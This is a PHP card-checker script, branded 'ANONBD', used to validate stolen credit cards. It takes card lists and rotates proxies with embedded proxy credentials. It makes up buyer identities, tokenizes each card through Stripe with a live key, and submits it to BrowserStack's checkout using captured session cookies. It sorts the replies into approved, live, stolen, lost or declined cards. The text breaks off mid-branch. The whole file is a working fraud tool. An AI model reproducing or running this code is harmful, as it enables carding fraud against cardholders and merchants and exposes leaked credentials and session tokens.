<?php

require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\:\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
/////////////////////==============[Init Proxy Section]===============//////////////////////////////
///////////////////////////===[Webshare proxys for cc checker]===////////////////////////////////////
$Websharegay = rand(0,250);
$rp1 = array(
  1 => 'udgirtrq-rotate:p8v1aueg6g5q',
  2 => 'vmpvxhux-rotate:s0up43libdet',
    ); 
    $rotate = $rp1[array_rand($rp1)];
//////////////////////////==============[Proxy Section]===============//////////////////////////////
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'http://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)){
$ip = "Live! ✅";
}
if (empty($ip1)){
$ip = "Dead![".$rotate."] ❌";
}
echo '[ IP: '.$ip.' ] ';
///////////////////////==============[End Proxy Section]===============//////////////////////////////#-------------------
////////////////////////////===[1ST CURL]
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/tokens',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'+'.$last.'&card[address_zip]='.$zip.'&card[address_country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=6903df19-82a2-4e79-9c32-942c8ba962510b19fd&muid=964fa07a-1403-4779-92ce-29b39602f7c21b7717&sid=9b9f5148-94c2-4f00-bea4-ffbaf5613559b2844e&payment_user_agent=stripe.js%2Fdca8db2fe%3B+stripe-js-v3%2Fdca8db2fe&time_on_page=44468&key=pk_live_40g8bjuzvlOrPg0e4GbbFXEBOwi8nvCnSMrwT5IORblarHzU5aYFEaS5QS6pCvJqmjKZTK6fAqyJPNzJ0dytSjW3000N5fu36y3&pasted_fields=number');



$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://accounts.browserstack.com/orders');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: accounts.browserstack.com',
'method: POST',
'path: /orders',
'scheme: https',
'accept: text/javascript, application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: __cf_bm=bXuMxzIhAJZGKdbh2KRBK2brz5E82b8ucbFJNZuw864-1649356585-0-AU4Owmo2C+oqzlXOeV4tMHSLGLXQV6azNSd/+fGHTm363RTZC3q3QHiivBvLhu7Lp5TFAaoCNY+PHRefV9jMFR4=; __cfruid=6ca9bbcfc4bb902a887a7b462ab419f55b3cb278-1649356585; tracking_id=84551956-c868-45d9-a313-b4285d705c39; moved=1; GAstartTime=1649356592285; bs_deviceId=43fb6652-0075-b142-5b61-b0bdc40c8e6b; _gcl_au=1.1.724127214.1649356593; _vwo_uuid_v2=D1081FFC137974B05885D34B9B6FC8B26|bf64779579b28284f3bcdcc2244ed530; _ga=GA1.2.1635842230.1649356605; _gid=GA1.2.1002670171.1649356605; _vis_opt_s=1|; _vis_opt_test_cookie=1; _vwo_uuid=D1081FFC137974B05885D34B9B6FC8B26; _vwo_ds=3:t_0,a_0:0$1649356591:23.64326981:::5_0,3_0:1; _fbp=fb.1.1649356611774.1756913871; tft_exp_allocated=signup; _rdt_uuid=1649356637372.c1d55248-af6c-49d9-a96d-7e317b6e6f5d; _vwo_uuid_v2=D1081FFC137974B05885D34B9B6FC8B26|bf64779579b28284f3bcdcc2244ed530; _session=5e4793243121051449d590f9e5eef5ec; bs_logging_id=5961847; bs_group_id=5878996; bs_user_details={"user_details":{"user_id":5961847,"group_id":5878996},"plan_details":{"live_testing":{"type":"Trial"},"automate":{"type":"Trial"},"screenshot":{"type":"Trial"},"app_live_testing":{"type":"Trial"},"app_automate":{"type":"Trial"},"percy":{"type":"Trial"},"high_scale_testing":{"type":"Trial"}}}; _clck=11gilga|1|f0f|0; ab_users={"48":105,"_allocation":"f6556e5d-eab8-4335-af69-f7675971bc5f","54":116,"49":107,"60":129,"40":87,"55":119,"63":134}; show_freshchat=2; bs_chat_channels=free_user; _vwo_sn=0:6; _vis_opt_exp_535_combi=1; ga_pa_status=npa; p_buy=false; _gat_browserstack=1; _gat=1; _uetsid=c11f2360b6a111ec87673383b25650f5; _uetvid=c11f5e30b6a111ecbf65dfd6eff9eb40; _clsk=wj4kv3|1649356976379|3|1|i.clarity.ms/collect; GAlastSentTime=1649356999278; amp_985eaa=43fb6652-0075-b142-5b61-b0bdc40c8e6b.NTk2MTg0Nw==..1g02l116d.1g02lddin.16.p.1v',
'origin: https://www.browserstack.com',
'referer: https://www.browserstack.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'utf8=%E2%9C%93&authenticity_token=c2%2B%2BF69OUC4zatB6hUsg94x76b3iL0Nc4uGs2sOuQStadej2SWW%2FMH1pyS9vXQTHHazwTNXHMx7UvSXn58Pgnw%3D%3D&is_from_checkout_page=true&is_tax_checkout_page=true&stripeToken='.$id.'&gaCID=1635842230.1649356605&cardDetails=null&authenticity_token=JcyAMAx4X78puANkhahWjr7c4%2FQXxDRuWW%2BsdovZ02sM1tbR6lOwoWe7GjFvvnK%2BLwv6BSAsRCxvMyVLr7Ry3w%3D%3D');


$result2 = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];

// this is for additional info - so result will look more good by adding the info of the bin

/////////// [Bin Lookup] /////////////

$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);


# ----------------------------------------------------------- [Responses] ------------------------------------------------------- #



# ------------------------------------------------- [CVV Responses ] ------------------------------------------------------------ #

if
(strpos($result2,  '"cvc_check": "pass"')) {
  echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE</span> |  <span class="badge badge-warning">{MSG:- CVC MATCHED}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
} 

elseif
(strpos($result2,  "Thank You For Donation.")) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You For Donation.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
} 

elseif
(strpos($result2,  '"success:true"')) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You For Donation.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
} 

elseif
(strpos($result2,  "Your card does not have sufficient funds. Please update your card details in our payment section.")) {
    echo '</br><span class="badge badge-success">APPROVED</span> : <span class="badge badge-primary"> ' . $lista . ' </span> <span class="badge badge-warning">CCV MATCHED {MSG:- NO BALANCE.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span></br>';
} 

elseif
(strpos($result2,  'Your card zip code is incorrect.')) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Your Card Zip Code Is Incorrect.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
} 

elseif
(strpos($result2,  '/donations/thank_you?donation_number=','')) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You For Donation. }</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
} 

elseif
(strpos($result2,  "Please update your card details in our payment section.")) {
    echo '</br><span class="badge badge-success"APPROVED</span> : <span class="badge badge-primary"> ' . $lista . ' </span> <span class="badge badge-warning">CCV MATCHED sufficient funds</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span></br>';
} 


elseif
(strpos($result2,  '"type":"one-time"')) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">{MSG:- CCV MATCHED}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
} 

# -------------------------------------------------- [CVV Responses END ] ------------------------------------------------------ #



# ----------------------------------------------------- [CCN Responses ] ------------------------------------------------------ #

elseif
(strpos($result2,  'Something went wrong.')) {
    echo '</br><span class="badge badge-success">Aprovada</span> : <span class="badge badge-primary"> ' . $lista . ' </span>|  <span class="badge badge-warning">CCN LIVE Security Code Is Incorrect</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span></br>';
}

elseif
(strpos($result2,  'Your cards expiration month is invalid.')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Security Code Is Invalid.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
}

elseif
(strpos($result2,  "Your card's security code is incorrect.")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Your Card&#039;s Security Code Is Incorrect.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  }

elseif
(strpos($result2,  "incorrect_cvc")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Incorrect CVC.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
}

#----------------------------------------------------- [CCN Responses END ]------------------------------------------------------ #



#--------------------------- [Stolen,Lost,Pickup,Insufficient Funds Responses]--------------------------------------------------- #

elseif
(strpos($result2,  "stolen_card")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Stolen Card.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
}

elseif
(strpos($result2,  "lost_card")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Lost Card.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
}

elseif
(strpos($result2,  'Your card has insufficient funds.')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Your Card Has Insufficient Funds.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
}

elseif
(strpos($result2,  "pickup_card")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Pickup Card.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
}

elseif
(strpos($result2,  "Your card does not have sufficient funds.")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Insufficient Funds.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
}

elseif
(strpos($result2,  '"cvc_check": "fail"')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- CVC FAILED.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
}

elseif
(strpos($result2,  'our card expiration month is invalid.')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- our cards expiration month is invalid.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
}

# -------------------------------------------------- [Stolen,Lost,Pickup,Insufficient Funds Responses END ] --------------------- #



# --------------------------------------------------- [Reprovada,Decline Responses ] -------------------------------------------- #

elseif
(strpos($result2,  'This card has expired. Please try again with another card.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Expired Card</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  'Your card number is incorrect.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Your Card Number Is Incorrect.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  "incorrect_number")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Your Card Number Is Incorrect.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  'Your transaction was declined. Please contact your bank for more information.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Card Was Declined</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  "generic_decline")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Generic Decline</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  "do_not_honor")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Do Not Honor The Card</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 


elseif
(strpos($result2,  "expired_card")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Expired Card</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  'Your card does not support this type of purchase.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Your Card Does Not Support This Type Of Purchase.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  "processing_error")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Processing Error</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2, "service_not_allowed")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Service Not Allowed</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  '"cvc_check": "unchecked"')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: CVC Unchecked</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  '"cvc_check": "unavailable"')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: CVC Unavailable </span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  "parameter_invalid_empty")) {
